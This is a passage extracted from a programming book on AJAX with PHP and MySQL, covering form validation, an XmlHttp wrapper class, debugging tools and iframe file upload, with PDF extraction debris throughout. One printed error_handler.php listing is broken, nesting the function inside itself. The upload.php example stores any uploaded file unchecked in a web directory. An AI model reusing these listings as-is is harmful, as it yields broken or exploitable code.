 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
  
  <head>
  
  
  <title> 
  
    
  Practical AJAX: PHP Parameters and Error Handling 
  
  
 </title>
  
  
  <script type=""text/javascript"" src=""divide.js""></script>
  
  
 </head>
  
  
  <body>
  
  
  <p>Ask server to divide
  
    
  <input type=""text"" id=""firstNumber"" />
  
    
  by
  
    
  <input type=""text"" id=""secondNumber"" />
  
    
  <input type=""button"" value=""Send"" onclick=""process()"" />
  
  </p>
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 3. Create a new file named 
 divide.js
 . For brevity we're not including the usual 
 functions you've already seen numerous times already—please take them from 
 other exercises (the template is 
 async.js
  from Chapter 2), or from the code 
 download. 
  
 // holds an instance of XMLHttpRequest 
  
 var xmlHttp = createXmlHttpRequestObject();
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // ... take from code download 
  
 } 
  
 // initiates a server request to send the numbers typed by the 
 user 
  
 [
  124 
 ]",NA
What just happened?,"You must be familiar with all the code on the client side by now, except the error-
 handling code in 
 handleServerResponse()
 . On the server-side, we also have 
 some code to analyze: 
 divide.php
  and 
 error_handler.php
 .
  
 divide.php
  
 The 
 divide.php
  script has a simple mission: it is expected to output the result of the 
 division of the numbers it receives as parameters in the form of a simple XML 
 structure, such as:
  
 <response>2.5</response>
  
 The script starts by loading the error-handling routine:
  
 <?php
  
 // load the error handling module
  
 require_once('error_handler.php');
  
 This file contains generic error-catching code which executes whenever an error 
 happens in your code. In our particular example, we're expected to receive errors 
 when the ""numbers"" supplied as parameters aren't numbers, or if we try to do a 
 division by 0.
  
 [
  128 
 ]",NA
Working with MySQL,"The next logical step is to do ""work"" on stored data. Perhaps you will need to create a 
 mailing list, or calculate the number of entries that match certain criteria, or generate a 
 customer's order history. A backend data store is necessary when you implement almost 
 any kind of application that is expected to generate some useful dynamic output. The 
 most common way to store data is by using 
 Relational Database Management Systems
  
 (
 RDBMS
 )—very powerful tools that store and manage data.
  
 Much like the other ingredients, the database is not a part of AJAX, but it's not likely that 
 you'll be able to build real-world web applications without a database to support them. 
 In this book, we'll present simple applications that don't have impressive data needs, 
 but require a database nonetheless. We've chosen (like so many thousands of others) to 
 use MySQL, which is a very popular, powerful, and reliable database. In addition, its 
 functionality is very generic, so it can be  ported to other database systems with very 
 little effort.
  
 To build an application that uses databases you need to know the basics of:
  
 1. Creating database tables that hold your data.
  
 2. Writing SQL queries to manipulate that data.
  
 3. Connecting to your MySQL database using PHP code.
  
 4. Sending SQL queries to the database, and retrieving the results.
  
  
 Once again, we'll only be able to cover the very basics of working with 
  
  
 PHP and MySQL databases here. The free online manuals of PHP and 
  
 MySQL are quite well written; you will certainly find them useful along 
  
 the way.
  
 [
  134 
 ]",NA
Creating database tables,"To create a data table, you need to know the basic concepts of the structure of a 
 relational database. A data table is made up of columns (
 fields
 ), and rows (
 records
 ). 
  
 When creating a data table, you need to define its fields, which can have various 
 properties. Here we will discuss:
  
 •
  
 Primary Keys
  
 •
  
 Data types
  
 •
  
 NULL and NOT NULL columns
  
 •
  
 Default column values
  
 •
  
 auto_increment
  columns
  
 •
  
 Indexes
  
 The 
 Primary Key
  is a special column (or a set of columns) in a table that makes each 
 row uniquely identifiable. The Primary Key column doesn't allow repeating values, so 
 every value will be unique. When the Primary Key is formed of more than one column, 
 the set of columns must be unique. 
  
 How about an easy example? Let's say you had a table with two columns (fields) ""first 
 name"" and ""phone number"". In most cases, you would find several people with the same 
 first name; in other words, in the ""first name"" column you would find several rows that 
 had the name ""Dave"", for example. You couldn't really use the ""first name"" column as your 
 primary key but ""phone number""… now there's a possibility! 
  
 Usually the ""phone number"" column won't have any values repeated in its rows, after 
 all, phone numbers are unique! You could reasonably decide to use the ""phone number"" 
 as your primary key. ""But wait,"" you say, ""my spouse and I both have the same phone 
 number!"" In that case, we need to set the primary key to look at 
 both 
 ""first name"" and 
 ""phone number"" together because their combination will always produce unique values.
  
 Technically, 
 PRIMARYKEY
  is a constraint (a rule) that you apply to a column, but for 
 convenience, when saying ""primary key"", we usually refer to the column that has the 
 PRIMARYKEY
  constraint. When creating a 
 PRIMARYKEY
  constraint, a unique index is also 
 created on that column, significantly improving searching performance. 
  
 Each column has a 
 data type
 , which describes its size and behavior. There are three 
 important categories of data types (
 numerical types
 , 
 character and string types
 , and 
 date 
 and time types
 ), and each category contains many data types. For complete details on 
 this subject, refer to the official MySQL 5 documentation at 
 http://dev.mysql.com/ 
 doc/refman/5.0/en/data-types.html
 . 
  
 [
  135 
 ]",NA
Manipulating data,"You can manipulate your data using SQL's 
 Data Manipulation Language
  (
 DML
 ) 
 commands, 
 SELECT
 , 
 UPDATE
 , and 
 DELETE
 , used to retrieve, add, modify, and delete 
 records from data tables. These commands are very powerful, and flexible. Their basic 
 syntax is:
  
 SELECT <column list>
  
 FROM <table name(s)>
  
 [WHERE <restrictive condition(s)>]
  
 INSERT INTO <table name> [(column list)] 
  
 VALUES (column values)
  
 [
  137 
 ]",NA
Connecting to your database and executing ,NA,NA
queries,"In our examples, the code that connects to the database will be written in PHP. As Figure 
 4-9 shows, the database will never be accessed directly by the client, but only by the 
 business logic written in the PHP code on the server:
  
  
 user
  
 web client
  
 client requests a 
 .PHP resource
  
 Apache
  
 the PHP script
  
 MySQL
  
 after PHP script finishes 
 execution, the results 
  
 (HTML, JavaScript) are 
 sent back to the client
  
 reads data from
  
 the database
  
 web server
  
 Figure 4-9: User connecting to MySQL through layers of functionality
  
 To get to the necessary data, your PHP code will need to authenticate to the database. 
  
 Database security—as with any other kind of security system—involves two important 
 concepts: 
 authentication
  and 
 authorization
 . Authentication is the process in which the 
 user is uniquely identified using some sort of login mechanism (usually by entering a 
 username and password). Authorization refers to the resources that can be accessed 
 (and actions that can be performed) by the authenticated user. 
  
 If you configured MySQL security as shown in the Appendix, you will connect to your 
 local MySQL server, to the database called 
 ajax
 , as a user called 
 ajaxuser
 , with the 
 password 
 practical
 . These details will be kept in a configuration file called 
 config.php
 , which can be easily updated when necessary. The 
 config.php
  script 
 will look like this:
  
 <?
  
 // defines database connection data
  
 define('DB_HOST', 'localhost');
  
 define('DB_USER', 'ajaxuser');
  
 define('DB_PASSWORD', 'practical');
  
 define('DB_DATABASE', 'ajax'); 
  
 ?>
  
 [
  139 
 ]",NA
Time for action – working with PHP and MySQL ,"1. Connect to the 
 ajax
  database using phpMyAdmin, and create a table named 
  
  
 users
  with the following code:
  
 CREATE TABLE users 
  
 (
  
  user_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
  
 [
  140 
 ]",NA
What just happened?,"First of all, note that there is no AJAX going on here; the example is demonstrating plain 
 PHP data-access functionality. All the interesting things happen in 
 index.php
 . The real 
 functionality starts by loading the error handler, and the configuration scripts:
  
 <?php
  
 // load configuration file
  
 require_once('error_handler.php');
  
 require_once('config.php');
  
 Then, just as mentioned, we create a new database connection:
  
 // connect to the database
  
 $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_DATABASE); 
  
 Note that a database connection contains a reference to a specific database inside the 
 database server, not to the database server itself. The database we connect to is 
 ajax
 , 
 which contains the 
 users
  table that you created earlier. When performing queries on the 
 created connection, you can count on having access to the 
 users
  table: 
  
 // the SQL query to execute
  
 $query = 'SELECT user_id, user_name FROM users'; 
  
 // execute the query
  
 $result = $mysqli->query($query); 
  
 [
  143 
 ]",NA
Summary,"Hopefully, you have enjoyed the little examples in this chapter because many more will 
 follow! This chapter walked you through the technologies that live at the server side of a 
 typical AJAX application. We did a few exercises that involved simple server 
 functionality, and PHP did a wonderful job at delivering that functionality. 
  
 You also learned the basics of working with databases, and simple database 
 operations with the first table created in this book.
  
 In the following chapters, you'll meet even more interesting examples that use 
 more advanced code to implement their functionality. In Chapter 5, 
 AJAX Form 
 Validation
 , you'll build an AJAX-enabled form validation page, which is safe to work 
 with even if the client doesn't support JavaScript and AJAX.
  
 [
  144 
 ]",NA
AJAX Form Validation,"Input data validation is an essential feature for any modern software application. In 
 the case of web applications, validation is an even more sensitive area because your 
 application is widely reachable by many users with varying skill sets (and 
 intentions).
  
 Validation is not something that you can play with—invalid data has the potential to 
 harm the application's functionality, result in errant and inaccurate reporting, and even 
 corrupt the application's most sensitive area—the database.
  
 Validating data requires checking whether the data entered by the user complies with 
 rules established in accordance with the business rules of your application 
 before 
 allowing it to be used. For example, if dates must be entered in the YYYY-MM-DD format, 
 then a date of February 28 would be invalid. Email addresses and phone numbers are 
 other examples of data that should be checked against valid formats. 
  
 In addition, validation must guard against ""SQL injection""—which could corrupt, 
 control, and/or access your data and database.
  
  
 The importance of carefully defining input data validation rules 
  
  
 and consistently applying those rules cannot be overstated!",NA
Implementing AJAX form validation,"The form validation application we will build in this chapter validates the form at the 
 server side on the classic form submit, implementing AJAX validation while the user 
 navigates through the form. The final validation is performed at the server, as shown in 
 Figure 5-1:
  
 [
  146 
 ]",NA
"XMLHttpRequest, version 2","As in this book we do our best to combine theory and practice, before moving on to 
 implementing the AJAX form validation script, we'll have another quick look at our 
 favorite AJAX object—
 XMLHttpRequest
 .
  
 On this occasion, we will step up the complexity (and functionality) a bit and use 
 everything we have learned until now. We will continue to build on what has come before 
 as we move on; so again, it's important that you take the time to be sure you've 
 understood what we are doing here. Time spent on digging into the materials really pays 
 off when you begin to build your own application in the real world.
  
 In Chapter 2, we took a sneak peak at the 
 XMLHttpRequest
  object—the nexus of the 
 AJAX world. Back then, we didn't have any OOP JavaScript skills. We've seen the power 
 hidden in JavaScript in Chapter 3. In Chapter 4, we saw how PHP works together with 
 AJAX requests.
  
 Our OOP JavaScript skills will be put to work improving the existing script that used to 
 make AJAX requests. In addition to the design that we've already discussed, we're 
 creating the following features as well:
  
 •
  
 •
  
 Flexible design so that the object can be easily extended for future needs 
 and purposes
  
 The ability to set all the required properties via a JSON object
  
 We'll package this improved 
 XMLHttpRequest
  functionality in a class named 
 XmlHttp
  
 that we'll be able to use in other exercises as well. You can see the class diagram in the 
 following screenshot, along with the diagrams of two helper classes:
  
 •
  
 •
  
 settings
  is the class we use to create the call settings; we supply an instance of 
 this class as a parameter to the constructor of 
 XmlHttp
  
 complete
  is a callback delegate, pointing to the function we want executed 
 when the call completes
  
 [
  150 
 ]",NA
Time for action – the XmlHttp object ,"1. In the 
 ajax
  folder, create a folder named 
 validate
 , which will host the 
  
  
 exercises in this chapter.
  
 2. In the 
 validate
  folder, create a new file named 
 xhr.js
  and add the 
  
 following code to it:
  
 // XmlHttp constructor can receive request settings: 
  
 // url - the server url 
  
 // contentType - request content type 
  
 // type - request type (default is GET) 
  
 // data - optional request parameters 
  
 // async - whether the request is asynchronous (default is 
 true) // showErrors - display errors 
  
 // complete - the callback function to call when the request // 
 completes 
  
 function XmlHttp(settings)
  
 [
  151 
 ]",NA
What just happened?,"The code listed above contains significant code from the previous examples and then 
 some new code. Let's break it down into small pieces and analyze it.
  
 The chosen name for our reusable object is 
 XmlHttp
 . Its functionality is wrapped in 
 two functions:
  
 •
  
 •
  
 XmlHttp.create()
 : A static method of the 
 XmlHttp
  object that creates a 
 XmlHttpRequest
  object
  
 XmlHttp()
 : The constructor of the 
 XmlHttp
  object
  
 From a design point of view, the 
 XmlHttp
  object represents a wrapper around the 
 XmlHttpRequest
  object. The 
 XmlHttp.create()
  method contains the same code that 
 we have previously seen in the 
 createXmlHttpRequestObject()
  method. It simply acts 
 like a factory for an 
 XmlHttpRequest
  object.
  
 The constructor of the 
 XmlHttp
  object, although it can look quite scary at first sight, 
 actually contains very simple code—provided that you know the theory from Chapter 3, 
 Object Oriented JavaScript
 . The constructor receives as a parameter a JSON object 
 containing all the settings for the 
 XmlHttp
  object. Choosing a JSON object is both 
 convenient from the extensibility point of view and easy from the programming point of 
 view. We store the settings in a property with the same name.
  
 function XmlHttp(settings)
  
 {
  
  // store the settings object in a class property
  
  this.settings = settings;
  
 [
  156 
 ]",NA
AJAX form validation,"In the previous chapter, we talked about error handling and database operations. In this 
 chapter, we redesigned the code for making AJAX requests when creating the 
 XmlHttp
  
 class. The AJAX form validation application makes use of these techniques. 
  
 The application contains three pages:
  
 •
  
 One page renders the form to be validated
  
 •
  
 Another page validates the input
  
 •
  
 The third page is displayed if the validation is successful
  
 The application will have a standard structure, composed of these files:
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 index.php
 : It is the file loaded initially by the user. It contains references to 
 the necessary JavaScript files and makes asynchronous requests for 
 validation to 
 validate.php
 .
  
 index_top.php
 : It is a helper file loaded by 
 index.php
  and contains several 
 objects for rendering the HTML form.
  
 validate.css
 : It is the file containing the CSS styles for the application.
  
 json2.js
 : It is the JavaScript file used for handling JSON objects.
  
 xhr.js
 : It is the JavaScript file that contains our 
 XmlHttp
  object used for 
 making AJAX requests.
  
 validate.js
 : It is the JavaScript file loaded together with 
 index.php 
 on 
 the client side. It makes asynchronous requests to a PHP script called 
 validate.php
  to perform the AJAX validation.
  
 validate.php
 : It is a PHP script residing on the same server as 
 index.php
 , 
 and it offers the server-side functionality requested asynchronously by the 
 JavaScript code in 
 index.php
 .
  
 validate.class.php
 : It is a PHP script that contains a class called 
 Validate
 , which contains the business logic and database operations to 
 support the functionality of 
 validate.php
 .
  
 config.php
 : It will be used to store global configuration options for your 
 application, such as database connection data, and so on.
  
 error_handler.php
 : It contains the error-handling mechanism that changes 
 the text of an error message into a human-readable format.
  
 allok.php
 : It is the page to be displayed if the validation is successful.
  
 Bearing all this in mind, it's time to get to work!
  
 [
  159 
 ]",NA
Time for action – AJAX form validation ,"1. If you missed the database exercise in Chapter 4, 
 Using PHP and MySQL on 
  
  
 the Server
 , connect to the 
 ajax
  database and create a table named 
 users
  with 
  
  
 the following code; otherwise, skip to step 3.
  
 CREATE TABLE users 
  
 (
  
  user_id INT UNSIGNED NOT NULL AUTO_INCREMENT, 
 user_name VARCHAR(32) NOT NULL,
  
  PRIMARY KEY (user_id) 
  
 );
  
 2. Execute the following 
 INSERT
  commands to populate your 
 users
  table with some 
 sample data: 
  
 INSERT INTO users (user_name) VALUES ('bogdan'); 
  
 INSERT INTO users (user_name) VALUES ('audra'); 
  
 INSERT INTO users (user_name) VALUES ('cristian');
  
 3. Let's start writing the code with the presentation tier. We'll define the styles for 
 our form by creating a file named 
 validate.css
 , and adding the following 
 code to it:
  
 body 
  
 {
  
  
  font-family: Arial, Helvetica, sans-
 serif;
  
  font-size: 0.8em;
  
  
  color: #000000; 
  
 }
  
 label 
  
 {
  
  
  float: left;
  
  
  width: 150px;
  
  
  font-weight: 
 bold; 
  
 }
  
 input, select 
  
 {
  
  
  margin-bottom: 3px; 
  
 }
  
 .button 
  
 {
  
  
  font-size: 2em; 
  
 }
  
 [
  160 
 ]",NA
What just happened?,"The AJAX validation technique allows us to validate form fields and at the same time 
 inform users if there were any validation errors, and the icing on the cake is that we are 
 doing it without interrupting the user's activity!
  
 The client-side validation is combined with a pure server-side PHP validation that 
 takes place when the user clicks on 
 Submit
  and thereby submits the entire form to the 
 server. Because of two PHP scripts, 
 validate.php
  and 
 validate.class.php
 , both 
 validation types are supported at the server.
  
 [
  176 
 ]",NA
Summary,"We saw how to put into practice everything that we had learned so far in JavaScript by 
 building our own flexible, extensible, reusable object for AJAX requests. We 
 demonstrated the application structure that we specified as well.
  
 Our intention here wasn't to build the perfect validation technique but, rather, a 
 working proof of the concept that takes care of user input and ensures its validity.
  
 This validation technique isn't possible with JavaScript alone, nor would you want to wait 
 for the fields to be validated only on form submit.
  
 Now that we've finished a complete, quite complex case study, it's time to have a quick 
 look at some useful tools that we can use to debug and profile our AJAX code.
  
 [
  182 
 ]",NA
Debugging and Profiling ,NA,NA
AJAX Applications,"Throughout the lifetime of a software product, there is at least one phase of testing the 
 code. The first iteration of software that most programmers write (the authors of this 
 book included) usually has room for improvement. The investigation of software's 
 behavior during execution, by gathering data with the goal to 
  
 identify its weaknesses and improve them, is known as 
 profiling
  or 
 performance 
 analysis
 . Normally, pointing out of mistakes, critiques, or suggestions of areas for 
 improvement induces cringing. Not so with testing—this is your chance to ""get the bugs 
 out"" and/or improve performance before your public regretfully experiences any ""room 
 for improvement"". It is the opportunity to earnestly seek out any weaknesses or less-
 than-ideal happenings and avoid their discovery (usually by surprise) when it may be 
 too late to readily fix the problem without a major rework of your design.
  
 No matter what technology or platform you choose, you'll find many tools on the 
 market to help you test, debug, and objectively gauge the performance of your 
 application. There are some great tools that will make your life easier when writing 
 and debugging AJAX applications. In this chapter, we're going to delve into the 
 following:
  
 •
  
 •
  
 •
  
 Learn how to enable and use Internet Explorer's debugging capabilities Work 
 with Web Development Helper, Developer Toolbar, and other Internet Explorer 
 tools 
  
 Work with Firefox plugins such as Firebug, Venkman JavaScript Debugger, and 
 Web Developer",NA
Debugging and profiling with Internet ,NA,NA
Explorer,"Here you'll learn how to:
  
 •
  
 Enable debugging in Internet Explorer 6 and 7
  
 •
  
 Use the Developer Tools application in Internet Explorer 8
  
 •
  
 Work with Firebug, Internet Explorer Developer Toolbar, and other tools",NA
Enabling debugging in Internet Explorer 6 ,NA,NA
and 7,"When you need to debug JavaScript code with Internet Explorer, we recommend 
  
 you use Internet Explorer 8 (or later), because of its integrated Developer Tools 
  
 application. However, if you need to use Internet Explorer 7 or older, here's how.
  
 In Internet Explorer 7 and its lower versions, there is no integrated JavaScript 
  
 debugger support. By default, JavaScript errors are ignored by Internet Explorer. 
  
 So in order to be able to debug in Internet Explorer, you need to:
  
 •
  
 Start Internet Explorer and go to 
 Tools | Internet Options | Advanced 
 and 
 deselect the 
 Disable script debugging (Internet Explorer)
  and 
 Disable script 
 debugging (Other)
  checkboxes. If you want a pop-up window to be displayed 
 for each error, you need to deselect the 
 Display a notification about every 
 script error
  checkbox, as shown in Figure 6-1:
  
 [
  184 
 ]",NA
Debugging in Internet Explorer 8,"Internet Explorer 8 makes things easier for you because it doesn't require third-party 
 tools or utilities for debugging and profiling—instead, it includes an application called 
 Developer Tools
 , which is easily accessible via the 
 Shift+F12
  shortcut keys or by 
 clicking on the 
 DeveloperTools
  icon. Figure 6-3 shows the main 
 www.bing.com 
 page 
 opened for debugging with Developer Tools:
  
  
 Figure 6-3: Debugging using Developer Tools
  
 [
  186 
 ]",NA
Other Internet Explorer debugging tools ,"The features that you've just seen in action in Internet Explorer 8 are powerful and 
 allow you to go a long way in debugging and profiling your code. However, it's good to 
 know there are a few other options available:
  
 •
  
 •
  
 Firebug Lite
 : Firebug is probably the most popular JavaScript debugger. 
 Initially developed for Firefox, it now comes in the Firebug Lite version, 
 which is a JavaScript file that you can use with Internet Explorer, 
  
 Opera, and Safari, to simulate the ""native"" Firebug features. Get it from 
 http://getfirebug.com/lite.html
 .
  
 Internet Explorer Developer Toolbar
 : Microsoft offers the Internet Explorer 
 Developer toolbar as an option for exploring web pages. It is especially useful for 
 working with the page's DOM element, CSS styles, cookies, and so on. It can be 
 downloaded from Microsoft's website. After its installation is complete, you can 
 open it through 
 Tools | Toolbars | Explorer Bar | IE Developer Toolbar
 .
  
 [
  193 
 ]",NA
Debugging and profiling with Firefox,"The tools available for web development in Firefox have grown along with its ever-
 increasing number of users.
  
 For starters, Firefox offers an 
 Error Console
  accessible from the 
 Tools
  menu, where 
 all the JavaScript errors, warnings, and messages are logged. It also has a built-in script 
 evaluator within the document context, and the DOM Inspector tool, which can be 
 selected at installation time.
  
 Figure 6-14 shows the Error Console signaling a typo in our code:
  
  
 Figure 6-14: The Firefox error console
  
 [
  194 
 ]",NA
Firebug,"Firebug (
 http://www.getfirebug.com/
 ) is a Firefox add-on that offers almost 
  
 anything a web developer could want from a debugging tool:
  
 •
  
 Debugging and profiling script
  
 •
  
 Monitoring HTTP traffic
  
 •
  
 Examining HTTP headers
  
 •
  
 Inspecting and editing the DOM
  
 •
  
 Inspecting and editing CSS
  
 •
  
 Quick search for filtering errors and messages
  
 Delivering such a powerful set of tools in one free product makes Firebug the perfect 
  
 choice for debugging applications in Firefox. It's worth mentioning that Firebug can 
  
 conflict with the ""JavaScript Debugger"" (Venkman—shown next) add-on for Firefox, 
  
 causing erratic behavior and spurious errors. So if you have them both (many 
  
 developers do!) you may need to turn off Firebug when using Venkman.
  
 Figure 6-15 shows Firebug in action. In this example, we loaded the same 
  
 script we used earlier for testing the debug features of Internet Explorer 8: 
  
 http://localhost/ajax/javascript/xmlhttprequest/async.html
 . 
  
  
 Figure 6-15: Using Firebug
  
 [
  195 
 ]",NA
Venkman JavaScript debugger,"The Venkman JavaScript debugger (
 http://www.mozilla.org/projects/ 
 venkman/
 ) is a powerful tool for debugging in Mozilla-based browsers (Firefox, 
 Netscape, and SeaMonkey).
  
 Like Firebug, Venkman JavaScript Debugger offers debugging and profiling, full call 
 stack, breakpoints, local variables, and watches, all within a friendly user interface. After 
 installing the tool, you can execute it from the 
 Tools|JavaScriptDebugger 
 menu item. 
 Figure 6-17 shows the tool in action:
  
  
 Figure 6-17: The Venkman debugger in action
  
 [
  197 
 ]",NA
Web Developer,"Similar to Firebug and Internet Explorer Developer Toolbar, another Firefox 
 add-on, Web Developer (
 https://addons.mozilla.org/en-US/firefox/ 
 addon/60
 ), provides a most comprehensive set of tools for:
  
 •
  
 DOM information and inspection
  
 •
  
 Outlining different elements (frames, headings, tables, links, and so on)
  
 •
  
 HTTP headers, JavaScript, and images information
  
 •
  
 Cookies
  
 •
  
 CSS
  
 •
  
 Page validation (CSS, HTML, WAI, links, and Section 508)
  
 All in all, this extension is a very good companion for developing websites. The 
 homepage for this extension and some documentation can be found at: 
 http://chrispederick.com/work/web-developer/
 .",NA
Summary,"Debugging and testing are quite complex tasks and they could be the subject of an 
 entire book. The goal of this chapter was to introduce you to the common 
 debugging tools and offer a glimpse into the world of automated testing tools for 
 AJAX applications. 
  
 With the continuous growth of AJAX applications, the need for more complex tools will 
 generate new products, so it's worth keeping an eye on what's new in this domain. You 
 will have to work at debugging and profiling at some point in your development career 
 (at least you will need to be familiar with how it's done and why) so if you're not 
 familiar with these tools and how they're used, take some time now to explore them and 
 familiarize yourself with their inner workings—the effort is well worth the time!
  
 [
  199 
 ]",NA
Advanced Patterns and ,NA,NA
Techniques,"People often ask themselves: ""
 Is there a better way to do this?
 "" And this is a good 
 question to ask! Examining implementation alternatives gives us the opportunity to 
 improve a design. Analyzing methods, patterns, and techniques is so important that this 
 practice has developed into its own science and has created a set of guidelines for 
 solving typical problems that offer us predictable results. 
  
 By applying a set of common, recognized, industry-wide accepted patterns and 
 techniques, we simplify our day-to-day tasks and end up with scalable, stable, and 
 maintainable applications. Many applications answer common needs, resulting in 
 bodies of code that provide 
 ready-made
  solutions that are easily incorporated into a 
 larger application. 
  
 Usually these ""ready-made"" solutions have already been examined and tested for their 
 efficiency and ease of use (but not always, so it's a good idea to do a little research 
 before using one). Instead of ""reinventing the wheel"" each time you write a solution to 
 a common task, it's possible to save time (and, therefore, money and aggravation) by 
 making good use of such handy approaches.",NA
Predictive fetching pattern,"The Google Maps application is probably one of the most well-known applications that 
 use predictive fetching. When a user moves around in the map (by dragging it) the 
 images of the new regions appear, ideally, without having blank spaces or delays. This 
 makes the map look and feel more like a traditional printed map and provides the user 
 with a seamless experience. 
  
 However, there are several questions that may arise:
  
 1. How much information should be fetched in anticipation of need?
  
 2. What information allows us to prefetch more efficiently?
  
 3. Who decides when prefetching begins?
  
 In order to answer the first question, let's look at another common example—a client data 
 grid. When using a data grid, a typical scenario involves operations like paging, sorting, 
 editing, and filtering. All these operations require different amounts of data to be 
 available to the grid. Paging requires only a single page that can be computed ahead based 
 on the current criteria; thus we can prefetch, for example, the pages before and ahead of 
 the current page being displayed. In this way, the user is able to move through the pages 
 very quickly without having to wait for the server response.
  
 It's relatively easy to have 100 records on a client but what about 1,000,000 records? 
 Even though only a small portion of complete data may be displayed to the user, if the 
 data is then sorted (by date, for example) we must sort all of it and not just the little bit 
 being displayed. Depending on the amount of data, it may or may not be possible to 
 have this data prefetched on the client.
  
 Based on user profiles, browsing history, or any other behavioral aspect that we might 
 decide to collect and consider, distinct prefetching approaches are suggested for 
 different users. This decision can be made on the client side by implementing business 
 logic for it or, based on some statistics, it can be decided by the server.",NA
Progress indicator pattern,"Utterances such as ""Is it working?"", ""Is anything happening?"", or ""Is it 
 doing 
  
 anything?"" are good indicators that your site is, well, unsociable, uncivilized, and 
 inspiring ire. Keeping the user in the dark is not very nice. It is very important to keep 
 him informed about what's happening on the page—especially when requests are being 
 processed; otherwise, users think you're application isn't working.
  
 [
  204 
 ]",NA
Unobtrusive JavaScript,"Unobtrusive JavaScript represents a technique that separates the JavaScript behavioral 
 code from the page's content and presentation. This greatly eases maintainability, but 
 several factors need to be carefully considered and addressed when using this 
 technique:
  
 1. JavaScript inline 
 <script>
  elements are not used; only 
 <script>
  elements 
  
 with 
 src
  attributes are used:
  
 <script type=""text/javascript"" src=""path/filename.js""></script>.
  
 2. All the JavaScript code resides in separate JavaScript files.
  
 3. No use of inline event attributes on HTML elements.
  
 [
  205 
 ]",NA
Progressive enhancement and graceful ,NA,NA
degradation,"Back in the 1990's, a popular web design technique was graceful degradation. Pages 
 were written for the latest versions of browsers, and then various workarounds or 
 ""hacks"" were added to accommodate older versions. (Quite frequently, this was 
 achieved by writing separate pages and even entire sites for various browsers—a 
 maintenance nightmare.) It basically meant that an alternative version of the 
 functionality was available or, at a minimum, the user was informed of the 
  
 shortcomings of his browser/version, referred to a browser upgrade, or advised to use 
 another browser. It was a step in the right direction but still not very graceful.
  
 A decade later, the focus has shifted towards content and availability across different 
 browsers. Today, the progressive enhancement strategy approaches cross-browser 
 functionality from a different perspective—a baseline document contains the content in 
 simple (X)HTML, adding layers for presentation with CSS and interactivity or behavior 
 through client-side scripting with JavaScript. 
  
 Both techniques have the same goal of offering the user a better experience, but each 
 gets there in a very different way. While graceful degradation starts with the very best 
 and then attempts to degrade gracefully for older browsers, progressive enhancement 
 starts with a basic experience level that will work on all browsers and adds additional 
 functionality for browsers that are able to support it.
  
 In today's Rich Internet Applications, progressive enhancement has become the 
 best-practice technique for developing web applications.
  
 Using progressive enhancement, we have the following steps:
  
 1. Start with the content in (X)HTML markup and test it to ensure it works.
  
 2. Add CSS to change the layout and look of the page.
  
 3. Add JavaScript to add more behavior to the page.
  
 [
  207 
 ]",NA
Asynchronous file upload with AJAX,"The 
 XmlHttpRequest
  object falls short when it comes to using it for asynchronous file 
 uploads. All the modern web applications such as Gmail or Yahoo! Mail have 
 asynchronous file upload functionality. So, how does it work? Generally speaking, 
 there are only a couple of general cross-browser approaches:
  
 •
  
 Using an 
 <iframe>
  element for uploading the file
  
 •
  
 Using an Adobe Flash component
  
 Each having its pros and cons, there is no winning approach. In this section, we will 
 analyze how to resolve the problem using the first approach. 
  
 In order to better understand our solution, let's take a look at the basics.",NA
HTTP and how file upload works,"Many have a good understanding of how passing values using forms works, but when 
 it comes to file uploading, only few really understand it. The others simply consider 
 this as something ""magic"".
  
 A typical example of a form that uploads a file might look like the following code:
  
 <form action=""upload.php"" 
  
  method=""post""  
  
  enctype=""multipart/form-data"">
  
  <input name=""file"" type=""file"" />
  
  <input type=""submit"" name=""upload"" value=""Upload"" />
  
 </form>
  
 [
  208 
 ]",NA
Iframe for asynchronous file upload with ,NA,NA
AJAX,"What are we aiming for? The goal for us is to be able to upload a file without having the 
 page hanging during the upload and to provide feedback to the client. 
  
 The trick used to AJAXify a file upload is to intercept the form submit and create a 
 hidden <iframe> element that's used by the form to upload the file. Pretty cool, isn't it?
  
 We have been able to describe the mechanism in a single phrase. It's time to split it 
 into steps in order to ease our development:
  
 1. Intercept the form 
 submit
  event.
  
 2. Create a hidden 
 <iframe>
 .
  
 3. Redirect the form's target to the new 
 <iframe>
 .
  
 4. Provide feedback to the user while the file is uploading.
  
 [
  209 
 ]",NA
Time for action – asynchronous file upload with AJAX ,"To complete the AJAX file upload exercise, follow the steps:
  
 1. In your 
 ajax
  folder, create a new folder named 
 upload
 . All the files and 
  
 subfolders will be added to this folder.
  
 2. Now create and add the standard error handling file, 
 error_handler.php
 :
  
 <?php 
  
 // set the user error handler method to be error_handler 
 set_error_handler('error_handler', E_ALL); 
  
 // error handler function 
  
 function error_handler
 ($errNo, $errStr, $errFile, $errLine) {
  
  
  function error_handler($errNo, $errStr, $errFile, $errLine)
  
  {
  
  
  // clear any output that has already been generated
  
  
 if(ob_get_length()) ob_clean();
  
  
  // output the error message
  
  
  $error_message = 'ERRNO: ' . $errNo . chr(10) .
  
  'TEXT: ' . $errStr . chr(10) .
  
  'LOCATION: ' . $errFile .
  
    
  ', line ' . $errLine;
  
  
  echo $error_message;
  
  
  // prevent processing any more PHP scripts
  
  
 exit;
  
  
  } 
  
 } 
  
 ?>
  
 3. Create the 
 upload.php
  file that will be responsible for uploading the file on the 
  
 server and the corresponding 
 uploads
  folder where the files will be stored:
  
 <?php 
  
 $uploaddir = './uploads/'; 
  
 $file = $uploaddir . basename($_FILES['file']['name']); 
  
 if (move_uploaded_file($_FILES['file']['tmp_name'], $file)) { 
  
  $result = 1; 
  
 } else {
  
 [
  210 
 ]",NA
What just happened?,"With very few lines of code, we have rather nice upload behavior! We start analyzing the 
 solution with the server-side code.
  
 The 
 upload.phpfile
  is responsible for uploading the file to the server and all it does is 
 to copy the uploaded file to the 
 uploads
  directory. In order to better observe the 
 working of things, we've added a 10 second delay. After this period of time, the result of 
 the upload is echoed in the page.
  
 <?php 
  
 $uploaddir = './uploads/'; 
  
 $file = $uploaddir . basename($_FILES['file']['name']); 
  
 if (move_uploaded_file($_FILES['file']['tmp_name'], $file)) { 
  
  $result = 1; 
  
 } else {
  
  
  $result = 0; 
  
 } 
  
